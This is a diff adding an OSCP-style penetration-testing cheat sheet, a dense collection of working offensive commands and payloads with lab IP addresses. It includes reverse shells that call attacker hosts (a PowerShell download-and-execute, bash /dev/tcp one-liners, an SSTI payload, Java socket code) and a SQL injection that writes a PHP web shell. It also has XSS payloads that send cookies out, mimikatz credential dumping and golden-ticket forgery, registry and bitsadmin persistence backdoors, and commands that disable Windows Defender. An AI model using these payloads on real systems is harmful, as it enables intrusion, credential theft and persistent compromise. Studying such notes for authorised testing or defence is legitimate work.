@@ -1,0 +1,422 @@
+[OSCP Notes]
+https://github.com/tbowman01/OSCP-PWK-Notes-Public
+
+[Windows Kernel Exploit]
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/abatchy17/WindowsExploits
+
+[Asterisk pwfeedback Exploit]
+https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
+
+[smbmap]
+smbmap -H 10.10.10.10 -u aniq -p 'password'
+smbmap -H 10.200.3.219 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:a06e58d15a2585235d18598788b8147a'
+
+[tar wildcard]
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+[sql injection cheat sheet]
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+
+[sql bypass characters exfiltration]
+'+UNION+SELECT+char(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,109,100,39,93,63,62),null+into+outfile+'/var/www/html/shell.phtml'-- -
+
+[windows priv esc]
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sam-and-system-files
+
+[filetransfer]
+	[[netcat]]
+	nc -l -p 1234 > out.file (receiving)
+	nc -w 3 [destination] 1234 < out.file (sender)
+
+	[[python]]
+	python -m SimpleHTTPServer
+	wget [url]
+
+[Rejetto HFS: RCE]
+http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.10.0.84/ch4rm.exe%20C:\Users\Public\ch4rm.exe.}
+
+[POP3 server command]
+https://www.shellhacks.com/retrieve-email-pop3-server-command-line/
+
+[Hydra brute types]
+https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/
+
+[rdp bruteforce credentials]
+ncrack -vv --user offsec -P passwords rdp://target
+
+[upload nc.exe to windows]
+https://d47zm3.me/resources/infosec/reverse-shells/
+
+[ldapsearch]
+ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’
+
+[ad-ldap-enum]
+ad-ldap-enum.py -l 10.10.10.10 -d domain.local
+
+[escape rbash]
+ssh user@10.10.10.51 sh
+
+[autosolve crypto]
+https://scwf.dima.ninja/
+
+[jwt]
+https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a
+
+[imap]
+https://book.hacktricks.xyz/pentesting/pentesting-imap
+
+[nishang reverse shell]
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.19/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 1337
+
+[xss payloads]
+* keylogger
+http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
+* port scanning
+http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html
+
+[juicy potato]
+jp64.exe -t * -p C:\Windows\system32\cmd.exe -a "/c C:\Windows\Temp\charm.exe" -l 33333
+
+[wordpress password hash generator]
+http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4
+
+[msfvenom cheatsheet]
+https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet
+
+[socat port forward]
+socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+
+[shellshock cmd]
+https://github.com/opsxcq/exploit-CVE-2014-6271
+> curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://172.31.1.3/cgi-bin/test.cgi
+
+[windows:secretsdump]
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+secretsdump.py -just-dc hololive.local/DC01\$@10.10.225.71
+
+[certuril]
+certutil -URLCache -f http://10.8.2.121:9005/setup.msi  c:\Temp\setup.msi
+
+[service enumeration]
+# check the service privilege
+$ services
+## can you modify any service?
+$ cmd /c 'sc config <service> binpath="C:\test.exe"'
+## can you modify any binary that is executed by any services?
+$ icacls services\monitor1.exe
+	if yes
+	# can we start the service?
+	$ cmd /c 'sc sdshow monitor1'
+
+[tomcat curl upload]
+curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file hehe.war http://10.10.10.194:8080/manager/text/deploy?path=/application
+
+[shellshock]
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.10
+
+[PowerUp.ps1]
+powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+
+[git]
+• git status
+• git log
+• git log -p -1
+• git branch
+• git branch -r
+• git checkout dev
+• git tag
+   ◇ git show <tagname>
+       contoh => 06fbefc1da56b8d552cfa299924097ba1213dd93
+• git add <file>
+• git commit -m “Add”
+• git push
+
+[sqli union select payloads]
+1. database()
+2. user()
+3. @@version
+4. username
+5. password
+6. table_name
+7. column_name
+
+[kerberos cheatsheet]
+https://github.com/nidem/kerberoast
+
+[kerbrute]
+## userenum
+kerbrute userenum -d spookysec.local --dc AttacktiveDirectory.spookysec.local users.txt
+## bruteuser
+kerbrute bruteuser -d spookysec.loccal --dc 172.0.0.1 passwords.txt <user>
+
+[getNPuser.py]
+python3 getNPusers.py spookysec.local/ -no-pass -usersfile users.txt -request
+# to get TGT: AsREP attack
+
+[getUserSPNs.py]
+# requirements: need credentials
+python3 getUserSPNs.py spookysec.local/user:password -dc-ip 172.0.0.1 -request 
+# to get TGS: Kerberoasting
+
+[rejetto rce]
+http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.10.0.84/ch4rm.exe%20C:\Users\Public\ch4rm.exe.}
+
+[psexec]
+psexec.py -hashes LM:NTLM administrator@10.200.200.127
+psexec.pt domain/username:password@10.10.10.10
+
+[nikto cheatsheet]
+https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/
+
+[mysql: read file]
+select load_file('/tmp/data.blob')
+
+[mysql: user defined function]
+https://redteamnation.com/mysql-user-defined-functions/
+https://www.facebook.com/watch/?v=2060455820930493
+
+[ldap: dse namingcontexts search]
+ldapsearch -h 172.31.3.9 -x -s base namingcontexts
+
+[ldap: subtree query]
+ldapsearch -h 172.31.3.9 -x -b 'DC=spray,DC=csl' -s sub
+
+[asterisk password vuln]
+https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
+
+[mimikatz: general]
+privilege::debug
+log
+log customlogfilename.log
+
+
+[mimikatz: sekurlsa]
+sekurlsa::logonpasswords
+sekurlsa::logonPasswords full
+sekurlsa::tickets /export
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+
+[mimikatz: kerberos]
+kerberos::list /export
+kerberos::ptt c:\chocolate.kirbi
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+
+[mimikatz: crypto]
+crypto::capi
+crypto::cng
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+crypto::keys /export
+crypto::keys /machine /export
+
+[mimikatz: vault/lsadump]
+vault::cred
+vault::list
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+
+[mimikatz: ptt]
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
+
+[mimikatz: ekeys]
+sekurlsa::ekeys
+
+[mimikatz: dpapi]
+sekurlsa::dpapi
+
+[mimikatz: minidump]
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+
+[mimikatz: ptt]
+kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
+
+[mimikatz: golden/silver]
+kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
+kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
+kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
+
+[mimikatz: tgt]
+kerberos::tgt
+
+[mimikatz: purge]
+kerberos::purge
+
+[grep: recursive]
+grep -iRl "One Piece" /home /usr 2>/dev/null
+
+[asterisk call manager: login]
+Action:login
+Username:admin
+Secret:abc123
+
+[asterisk call manager: enumerate users]
+action: command
+command: sip show users
+
+[java decompyle]
+jad file.class
+
+[tmux: attach]
+tmux -S /tmp/shareds attach -t sharedsession
+
+[rpc: change password]
+https://malicious.link/post/2017/reset-ad-user-password-with-linux/
+> setuserinfo2 audit2020 23 password123
+
+[kerberos: getUserSpn]
+GetUserSPNs.py roast.csl/dsmith:WelcomeToR04st -dc-ip 172.31.3.2 -request
+
+[kerberos: GetNPUsers]
+GetNPUsers.py roast.csl/ -dc-ip 10.10.10.10 -no-pass -usersfile users
+
+[Impoersonate_tokens: PrintSpoofer]
+PrintSpoofer.exe -i -c cmd
+
+[Check unquoted path]
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
+
+[DLL Hijacking]
+* msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.84 LPORT=1337 -f dll -o Customs.dll
+* sc qc <service> # check service 
+* icacls  #check permission on currentdirectory
+* sc start <service>
+
+[turn off windows AV]
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
+[dll hijacking]
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.68.111 LPORT=53 -f dll -o plugin.dll
+smbserver.py SHARE `pwd`
+dnscmd.exe myserver.local /config /serverlevelplugindll \\10.211.55.13\share\plugin.dll
+
+[hashcat rules]
+hashcat -m 5600 -r /opt/OneRuleToRuleThemAll.rule hash /opt/rockyou.txt
+
+[nodejs reverse shell]
+require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
+
+[ld.so privesc]
+> ldd <file>
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example
+https://www.boiteaklou.fr/Abusing-Shared-Libraries.html
+
+[persistence: add registry key]
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming"
+
+[persistence: bitsadmin]
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor "http://10.11.11.36/backdoor.exe" "C:\Users\tryhackme\Documents\backdoor.exe"
+bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\tryhackme\Documents\backdoor.exe"
+bitsadmin /SetMinRetryDelay backdoor 15
+bitsadmin /resume backdoor
+
+[persistence: edit registry key]
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f
+
+[persistence: add admins user]
+net user ch4rm P@$$w0rd /add 
+net localgroup administrators ch4rm /add
+
+[crackmapexec/cme]
+crackmapexec smb 10.10.10.10 -u aniq -p pass.txt
+crackmapexec smb 10.200.3.1/24 -u administrator -d domain.local -H 'NTLM'
+
+[xss bypass]
+<SCRscriptIPT>document.location='http://10.14.3.113/ape.js?c='+document.cookie</SCRscriptIPT>
+<SCRscriptIPT>new Image().src="http://localhost/cookie.php?c="+document.cookie;</SCRscriptIPT>
+#make sure to use html entities
+
+[bypass space]
+IFS=,;`cat<<<cat,/etc/passwd`
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat</etc/passwd                 
+{cat,/etc/passwd} OR {ls,-las,/var} with args
+X=$'cat\x20/etc/passwd'&&$X
+
+[docker restart if crash]
+/usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
+
+[attach tmux socket]
+tmux -S /opt/.details attach
+
+[hydra: json]
+hydra -l admin@e-shopping-cart.com -P wordlistts.txt 192.95.148.3 http-post-form '/validate-otp:{\"email\"\:\"^USER^\",\"password\"\:\"pass\",\"otp\"\:\"^PASS^\"}:Error' -s 8080 -V
+
+[snmp enumeration]
+snmpwalk -v1 -c public 192.168.68.108
+nmap --script "snmp* and not snmp-brute" -p 161 -sU 192.168.68.108
+snmpwalk -v3 -a SHA -A STrP@SSWRD -x AES -X STr0ngP@SSWRD -l authPriv -u snmpadmin localhost | head
+
+[udp reverse shell]
+# listening
+nc.traditional -ulvnp 1337
+# attacker
+bash -i >& /dev/udp/127.0.0.1/4242 0>&1
+
+[sqli: boolean based sql injection]
+1. 0 or length(database())="6"
+# get the database name letters by letters
+2. 0 or substring(database(),1,1)='d'
+2.1 0 or substring(database(),2,1)='a'
+# get the database name letter sby letters using `like`
+3. 0 or database() like '%a%'
+3.1 0 or database() like 'a%'
+3.2 0 or databasE() like 'd__k'
+
+[sql read and write]
+SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
+SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
+SELECT LOAD_FILE('/etc/passwd')
+SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+SELECT file_priv FROM mysql.user WHERE user = 'netspi'
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'
+#reference: https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql
+
+[stored credentials on windows]
+cmdkey /list
+
+[run as another user windows]
+runas /savecred /user:admin-petersj /profile cmd.exe
+
+[evil-winrm]
+evil-winrm -i 10.200.3.219 -u administrator -H 'a06e58d15a2585235d18598788b8147a
+evil-winrm -i 10.200.3.219 -u administrator -p 'password'
+
+[stegcloack]
+https://stegcloak.surge.sh/
+
+[reverse shell]
+* ssti
+```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/192.168.0.143/9001 0>&1"')|attr('read')()}}
+```
+
+* java
+```
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+* jenkins
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+String ps = 'whoami'
+def proc = ps.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr" 
+```
